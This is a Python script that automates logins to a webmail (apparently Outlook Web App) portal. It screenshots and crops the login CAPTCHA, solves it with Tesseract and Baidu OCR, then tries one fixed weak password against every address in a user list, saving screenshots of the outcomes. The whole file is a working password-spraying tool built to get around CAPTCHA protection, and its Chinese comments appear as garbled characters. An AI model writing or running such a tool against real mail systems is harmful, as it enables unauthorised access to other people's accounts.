from selenium import webdriver
import time
from PIL import Image
import os
import pytesseract
import cv2
from aip import AipOcr


#��ȡ��֤�벢�����ڱ���
def GetCAPTCHA():
    #Ҫ�����Ƶ�url
    url = 'https://backend.xxx.com/owa/auth/logon.aspx?xxx������'
    WebSave = os.getcwd()+'\\web.png'
    driver = webdriver.Firefox()
    driver.get(url)
    driver.maximize_window()
    time.sleep(2)
    # 1.��¼ҳ���ͼ�������ڵ�ǰ�ļ���
    driver.save_screenshot(WebSave)
    # 2ͨ��id��ȡͼƬ��֤������ͳߴ�
    CodeElement = driver.find_element_by_id('idpass')
    left = CodeElement.location['x']
    top = CodeElement.location['y']
    right = CodeElement.size['width'] + left
    height = CodeElement.size['height'] + top
    im = Image.open(WebSave)
    # 3.��ȡͼƬ��֤��
    img = im.crop((left, top, right, height))
    # 4.��ȡ����֤��ͼƬ����Ϊ�µ��ļ�
    img.save(WebSave,quality=95)
    # driver.close()

# ͨ��pytesseractʶ����֤��
def  RecognizCAPTCHA(image):
    # ��Ե�����˲�  ȥ��
    blur = cv2.pyrMeanShiftFiltering(image, sp=8, sr=20)
    cv2.imshow('dst', blur)
    # �Ҷ�ͼ��
    gray = cv2.cvtColor(blur, cv2.COLOR_BGR2GRAY)
    # ��ֵ��
    ret, binary = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)
    print(f'��ֵ������Ӧ��ֵ��{ret}')
    cv2.imshow('binary', binary)

    cv2.imwrite(os.getcwd()+'\\web2.png',image)
    # ��̬ѧ����  ��ȡ�ṹԪ��  ������
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (3, 2))
    bin1 = cv2.morphologyEx(binary, cv2.MORPH_OPEN, kernel)
    cv2.imshow('bin1', bin1)
    kernel = cv2.getStructuringElement(cv2.MORPH_OPEN, (2, 3))
    # bin2 = cv2.morphologyEx(bin1, cv2.MORPH_OPEN, kernel)
    # cv2.imshow('bin2', bin2)
    # �߼�����  �ñ���Ϊ��ɫ  ����Ϊ��  ����ʶ��
    # cv2.bitwise_not(bin2, bin2)
    # cv2.imshow('binary-image', bin2)
    cv2.bitwise_not(binary, binary)
    cv2.imshow('binary-image', binary)
    # ʶ��
    # test_message = Image.fromarray(bin2)
    test_message = Image.fromarray(binary)
    text = pytesseract.image_to_string(test_message)
    print(f'ʶ������{text}')
    with open(os.getcwd()+'\\CAPTCHAtest.txt','a') as f:
        f.write(text)
    # src = cv2.imread(r'./test/045.png')
    # cv2.imshow('input image', src)
    # recognize_text(src)
    # cv2.waitKey(0)
    # cv2.destroyAllWindows()

def BaiduAI():
    """ ��� APPID AK SK """
    APP_ID = 'xxx'
    API_KEY = 'xxx'
    SECRET_KEY = 'xxx'
    client = AipOcr(APP_ID, API_KEY, SECRET_KEY)
    # ����ʶ��߾��Ȱ汾
    """ ��ȡͼƬ """
    def get_file_content(filePath):
        with open(filePath, 'rb') as fp:
            return fp.read()
    image = get_file_content(os.getcwd()+'\\web.png')
    """ ����������ͨ������ʶ�𣨸߾��Ȱ棩 """
    # result = client.basicAccurate(image, options)
    result = client.basicAccurate(image)
    #result = client.basicGeneral(image)
    CAPTCHAFinal = str(result)[30:36]
    # with open('test.txt','r',encoding='utf-8') as test:
    #     CAPTCHAFinal = test.read()[30:36]
    with open('CAPTCHAReault.txt','a') as fr:
        fr.write(str(CAPTCHAFinal) + '\n')
        # fr.write(str(CAPTCHAFinal)[30:36]+'\n')
    return CAPTCHAFinal


if __name__ == '__main__':
    WebSave = os.getcwd()+'\\web.png'
    pw = 'Aa123456'
    for line in open(os.getcwd()+'\\MailAddress.txt'):
        user= ''.join(line.split())
        CAPTCHARightSave = os.getcwd()+'\\CAPTCHARightSaveScreen' + '\\' + user + '.png'
        CAPTCHAWrongSave = os.getcwd()+'\\CAPTCHAWrongSaveScreen' + '\\' + user + '.png'
        driver = webdriver.Firefox()
        driver.get('mail.xxx.com......')
        driver.maximize_window()
        time.sleep(2)
        # 1.��¼ҳ���ͼ������
        driver.save_screenshot(WebSave)
        # 2ͨ��id��ȡͼƬ��֤������ͳߴ�
        CodeElementCAPTCHA = driver.find_element_by_id('idpass')
        left = CodeElementCAPTCHA.location['x']
        top = CodeElementCAPTCHA.location['y']
        right = CodeElementCAPTCHA.size['width'] + left
        height = CodeElementCAPTCHA.size['height'] + top
        im = Image.open(WebSave)
        # 3.��ȡͼƬ��֤��
        img = im.crop((left, top, right, height))
        # 4.��ȡ����֤��ͼƬ����Ϊ�µ��ļ�
        img.save(WebSave, quality=95)
        # driver.close()
        CAPTCHA = BaiduAI()
        #����֤������������֤��ͼƬ������֤���г��������ַ����޷�����֤�������������û�������
        try:
            os.rename(os.getcwd()+'\\web.png', os.getcwd()+'\\'+ CAPTCHA +'.png')
        except Exception as e:
            os.rename(os.getcwd()+'\\web.png', os.getcwd()+'\\'+ user + '.png')
            print(e,'***',CAPTCHA)
        CodeElementUser = driver.find_element_by_id('username')
        CodeElementUser.send_keys(user)
        CodeElementPwd = driver.find_element_by_id('password')
        CodeElementPwd.send_keys(pw)
        CodeElementPwd = driver.find_element_by_id('captcha')
        CodeElementPwd.send_keys(CAPTCHA)
        CodeElementLogin = driver.find_element_by_class_name('imgLnk')
        CodeElementLogin.click()
        time.sleep(2)
        CodeElementPwd = driver.find_element_by_id('idpassEx')
        if (CodeElementPwd.text=='δ�����C�a'):
            driver.save_screenshot(CAPTCHAWrongSave)
            driver.close()
        else:
            time.sleep(60)
            driver.save_screenshot(CAPTCHARightSave)
            driver.close()